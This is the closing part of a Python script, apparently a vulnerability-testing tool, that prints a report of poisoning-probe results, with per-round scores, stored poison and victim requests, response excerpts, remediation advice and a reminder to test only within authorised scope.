        _, v = best
        detail = [f'结论: {v.confidence} — {v.verdict}',
                  '各轮: ' + ' | '.join(
                      f'r{i+1}: score={r.score} {r.confidence}'
                      for i, r in enumerate(v.rounds))]
        rec = v.best_record
        if rec is not None:
            excerpt = _dec(rec.outcome.data)[:800] or '(无响应字节)'
            detail += [
                f'证据最高轮次: {rec.probe_id} (score {rec.analysis.score})',
                '--- POISON ---', repr(rec.poison),
                '--- VICTIM ---', repr(rec.victim),
                '--- RESPONSE 前 800 字符 ---', excerpt,
            ]
        detail.append(f'全部轮次原始数据: {artifacts.raw_dir}')
        section(f'最高证据详情: {v.technique}/{v.mode}', '\n'.join(detail))

    print_remediation(remediation_for(verdicts))

    high = [f'{v.technique}/{v.mode}' for _, v in verdicts if v.confidence == 'HIGH']
    if high:
        print(f'\n[!] 高危: {", ".join(high)} — 请仅在授权范围内进一步验证。')

    print(f'\n工件目录: {artifacts.dir}')
    return 0


if __name__ == '__main__':
    sys.exit(main())